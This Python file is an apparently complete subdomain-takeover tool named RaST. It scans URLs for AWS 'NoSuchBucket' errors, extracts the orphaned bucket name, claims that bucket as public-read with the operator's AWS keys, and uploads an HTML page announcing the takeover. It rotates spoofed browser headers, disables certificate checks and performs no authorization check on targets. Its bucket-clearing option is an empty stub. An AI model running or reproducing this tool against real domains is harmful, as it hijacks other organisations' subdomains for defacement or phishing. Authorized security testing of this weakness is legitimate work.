"""
RaST - Rapid Subdomains Take Over
Taking control over AWS subdomains with "NoSuchBucket" error.
Author: Higor Melgaço
Date: 07/02/2022
"""

from json import loads
from requests import get
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore
from random import choice
from datetime import datetime
from os import path, getcwd, remove
from boto3 import client as boto3_client
from traceback import format_exc as print_traceback
from argparse import ArgumentParser, SUPPRESS, HelpFormatter


configs = {
    "headers": [
        {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://www.google.com/",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        },
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://www.google.com/",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        },
        {
            "Connection": "keep-alive",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://www.google.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://www.google.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"
        }
    ],
    "logs": {
        "start": "{}[{}>{}] ~ RaST started!",
        "done": "{}[{}>{}] ~ RaST finished!",
        "empty_urls": "{}[{}>{}] ~ No urls to check",
        "checking_url": "\t{}[{}>{}] ~ Checking url {}<{}>{}",
        "creating_s3": "\t\t{}[{}>{}] ~ Creating S3 bucket with {}<{}>{} name",
        "uploading_file": "\t\t{}[{}>{}] ~ Uploading the file to perform the PoC",
        "takeover_complete": "\t\t{}[{}>{}] ~ Successfully taken control of {}<{}>{} subdomain",
        "error": "{}[{}!{}] ~ An error occurred: {}{}",
        "key_interrupt": "{}[{}!{}] ~ Well, it looks like someone interrupted the execution...",
        "timeout_error": "{}[{}!{}] ~ A timeout error occurred when checking the url {}<{}>{}",
        "error_checking_url": "\t{}[{}!{}] ~ An error occurred when checking the url {}<{}>{}: {}{}",
        "error_creating_s3": "\t\t{}[{}!{}] ~ An error occurred when creating bucket {}<{}>{}: {}{}",
        "error_sending_file": "\t\t{}[{}!{}] ~ An error occurred when sending PoC file to bucket {}<{}>{}: {}{}"
    },
    "argparser": {
        "desc_general": "RaST - Rapid Subdomains Take Over: Taking control over AWS subdomains with 'NoSuchBucket' error.",
        "address": "A single subdomain url to take control",
        "file": "A file with subdomains urls to take control",
        "take_over": "Creates the buckets with the name contained in the 'NoSuchBucket' error and uploads a file to evidence the PoC",
        "clear_s3": "Clears all the buckets in the AWS account used",
        "help": "Show this help message and exit."
    },
    "logo": r'''
    {}
                   (
                   )
                   (                 
            /\  .-"""-.  /\          *--------------------------------------* 
           //\\/  ,,,  \//\\         |   {}RaST - Rapid Subdomains Take Over{}  |
           |/\| ,;;;;;, |/\|         |  {}Taking control over AWS subdomains{}  |
           //\\\;-"""-;///\\         *--------------------------------------*
          //  \/       \/  \\        |        {}eremit4@protonmail.com{}        | 
         (| ,-_|       |_-, |)       |              {}SP/Brazil{}               |
           //`__\.-.-./__`\\         *--------------------------------------*
          // /.-({}O{}\ /{}O{})-.\ \\
         (\ |)   '---'   (| /)
          ` (|           |) `
            \)           (/

    ''',
    "poc_file": r'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>PoC - Subdomain Take Over</title>
        </head>
        <body style="background-color: black;">
            <h3 style="color:red;">Date: {}</h3>
            <h3 style="color:red;">Well, your domain was vulnerable to "Subdomain Take Over" and here's the proof!</h3>
            <br>
            <iframe src="https://giphy.com/embed/Ju7l5y9osyymQ" width="480" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
        </body>
        </html>
    '''
}


class CustomHelpFormatter(HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=50, width=100)

    def format_action_invocation(self, action):
        if not action.option_strings or action.nargs == 0:
            return super().format_action_invocation(action)
        default = self._get_default_metavar_for_optional(action)
        args_string = self._format_args(action, default)
        return ', '.join(action.option_strings) + ' ' + args_string


def get_targets(args_: ArgumentParser.parse_args) -> list:
    """
    receives the command line arguments and filter the addresses
    :param args_: command line arguments
    :return: a list with url(s)
    """
    if args_.address:
        return [args_.address]
    if args_.file:
        if not path.isfile(args_.file):
            return []
        with open(args_.file, 'r+') as fp:
            return [url.strip() for url in fp.readlines()]


def acquire_aws_credentials() -> dict:
    """
    open the config.json to get the aws credentials
    :return: a json with aws credentials
    """
    with open(path.join(getcwd(), 'config.json'), 'r') as config_file:
        return loads(config_file.read())


def urls_checker(url: str) -> object:
    """
    checks if the 'NoSuchBucket' error exist in url
    :param url:
    :return: the bucket name if the error exists else None
    """
    try:
        response = get(url, verify=False, timeout=5, headers=choice(configs['headers']))
        if 'NoSuchBucket' in response.text:
            return response.text.split('<BucketName>')[1].split('</BucketName>')[0]
    except TimeoutError:
        print(configs['logs']['timeout_error'].format(Fore.LIGHTWHITE_EX,
                                                      Fore.LIGHTRED_EX,
                                                      Fore.LIGHTWHITE_EX,
                                                      Fore.LIGHTRED_EX,
                                                      url,
                                                      Fore.LIGHTWHITE_EX))
        return None
    except Exception:
        print(configs['logs']['error_checking_url'].format(Fore.LIGHTWHITE_EX,
                                                           Fore.LIGHTRED_EX,
                                                           Fore.LIGHTWHITE_EX,
                                                           Fore.LIGHTRED_EX,
                                                           url,
                                                           Fore.LIGHTWHITE_EX,
                                                           Fore.LIGHTRED_EX,
                                                           print_traceback(),
                                                           Fore.LIGHTWHITE_EX))
        return None


def create_bucket(boto_client: boto3_client, bucket_name: str) -> bool:
    """
    creates a bucket with the name acquired on error 'NoSuchBucket'
    :param boto_client: boto3 s3 client
    :param bucket_name: bucket name acquired on the page
    :return: True if the bucket was created else False
    """
    try:
        resp_create_s3 = boto_client.create_bucket(Bucket=bucket_name, ACL='public-read')
        if resp_create_s3['ResponseMetadata'].get('HTTPStatusCode') == 200:
            return True
    except Exception:
        print(configs['logs']['error_creating_s3'].format(Fore.LIGHTWHITE_EX,
                                                          Fore.LIGHTRED_EX,
                                                          Fore.LIGHTWHITE_EX,
                                                          Fore.LIGHTRED_EX,
                                                          bucket_name,
                                                          Fore.LIGHTWHITE_EX,
                                                          Fore.LIGHTRED_EX,
                                                          print_traceback(),
                                                          Fore.LIGHTWHITE_EX))
        return False


def create_html() -> None:
    """
    creates the index.html file to submit to bucket
    :return: None
    """
    with open(path.join(getcwd(), 'index.html'), 'w') as fp:
        fp.write(configs['poc_file'].format(datetime.strftime(datetime.now(), "%d/%m/%Y")))


def submit_poc_file(boto_client: boto3_client, bucket_name: str) -> bool:
    """
    sends the PoC file to new bucket
    :param boto_client: boto3 s3 client
    :param bucket_name:
    :return:
    """
    try:
        with open(path.join(getcwd(), 'index.html'), 'rb') as data:
            boto_client.upload_fileobj(data, bucket_name, 'index.html')
            return True
    except Exception:
        print(configs['logs']['error_sending_file'].format(Fore.LIGHTWHITE_EX,
                                                           Fore.LIGHTRED_EX,
                                                           Fore.LIGHTWHITE_EX,
                                                           Fore.LIGHTRED_EX,
                                                           bucket_name,
                                                           Fore.LIGHTWHITE_EX,
                                                           Fore.LIGHTRED_EX,
                                                           print_traceback(),
                                                           Fore.LIGHTWHITE_EX))
        return False


def main(arguments: ArgumentParser.parse_args) -> None:
    """
    Execute the main function
    :param arguments: The arguments typed on the CLI
    :return: None
    """
    print(configs["logs"]["start"].format(Fore.LIGHTWHITE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
    aws_credentials = acquire_aws_credentials()
    s3_client = boto3_client('s3',
                             aws_access_key_id=aws_credentials.get('ACCESS_KEY_ID'),
                             aws_secret_access_key=aws_credentials.get('SECRET_ACCESS_KEY'),
                             region_name=aws_credentials.get('REGION'))
    if arguments.clear:
        # removing all buckets in our account
        return

    if arguments.takeover:
        urls = get_targets(arguments)
        if not urls:
            print(configs['logs']['empty_urls'].format(Fore.LIGHTWHITE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
            return

        # creating the index.html file to submit to bucket
        create_html()

        for url in urls:
            print(configs['logs']['checking_url'].format(Fore.LIGHTWHITE_EX,
                                                         Fore.LIGHTRED_EX,
                                                         Fore.LIGHTWHITE_EX,
                                                         Fore.LIGHTRED_EX,
                                                         url,
                                                         Fore.LIGHTWHITE_EX))
            bucket_name = urls_checker(url=url)
            if bucket_name is not None:
                print(configs['logs']['creating_s3'].format(Fore.LIGHTWHITE_EX,
                                                            Fore.LIGHTRED_EX,
                                                            Fore.LIGHTWHITE_EX,
                                                            Fore.LIGHTRED_EX,
                                                            bucket_name,
                                                            Fore.LIGHTWHITE_EX))
                if create_bucket(boto_client=s3_client, bucket_name=bucket_name):
                    print(configs['logs']['uploading_file'].format(Fore.LIGHTWHITE_EX,
                                                                   Fore.LIGHTRED_EX,
                                                                   Fore.LIGHTWHITE_EX))
                    if submit_poc_file(boto_client=s3_client, bucket_name=bucket_name):
                        print(configs['logs']['takeover_complete'].format(Fore.LIGHTWHITE_EX,
                                                                          Fore.LIGHTRED_EX,
                                                                          Fore.LIGHTWHITE_EX,
                                                                          Fore.LIGHTRED_EX,
                                                                          url,
                                                                          Fore.LIGHTWHITE_EX))

        # removes index.html file after the successful takeover procedure
        remove(path.join(getcwd(), 'index.html'))


if __name__ == "__main__":
    arg_style = lambda prog: CustomHelpFormatter(prog)
    args = ArgumentParser(description=configs["argparser"]["desc_general"], add_help=False, formatter_class=arg_style)
    group_required = args.add_argument_group(title="required arguments")
    group_required.add_argument("-a", "--address", metavar="address", type=str, help=configs["argparser"]["address"])
    group_required.add_argument("-f", "--file", metavar="file", type=str, help=configs["argparser"]["file"])
    group_required.add_argument("-t", "--take-over", dest='takeover', action='store_true', help=configs["argparser"]["take_over"])
    group_required.add_argument("-c", "--clear-buckets", dest='clear', action='store_true', help=configs["argparser"]["clear_s3"])
    group_optional = args.add_argument_group(title="optional arguments")
    group_optional.add_argument("-h", "--help", help=configs["argparser"]["help"], action="help", default=SUPPRESS)

    try:
        # perform coloroma multiplatform
        init(strip=False)
        # request warning disable
        disable_warnings(InsecureRequestWarning)

        print(configs['logo'].format(Fore.LIGHTWHITE_EX,
                                     Fore.RED,
                                     Fore.LIGHTWHITE_EX,
                                     Fore.RED,
                                     Fore.LIGHTWHITE_EX,
                                     Fore.RED,
                                     Fore.LIGHTWHITE_EX,
                                     Fore.RED,
                                     Fore.LIGHTWHITE_EX,
                                     Fore.LIGHTRED_EX,
                                     Fore.LIGHTWHITE_EX,
                                     Fore.LIGHTRED_EX,
                                     Fore.LIGHTWHITE_EX))
        main(args.parse_args())
    except KeyboardInterrupt:
        print(configs["logs"]["key_interrupt"].format(Fore.LIGHTWHITE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
    except Exception:
        print(configs["logs"]["error"].format(Fore.LIGHTWHITE_EX,
                                              Fore.LIGHTRED_EX,
                                              Fore.LIGHTWHITE_EX,
                                              Fore.LIGHTRED_EX,
                                              print_traceback()))
    print(configs["logs"]["done"].format(Fore.LIGHTWHITE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
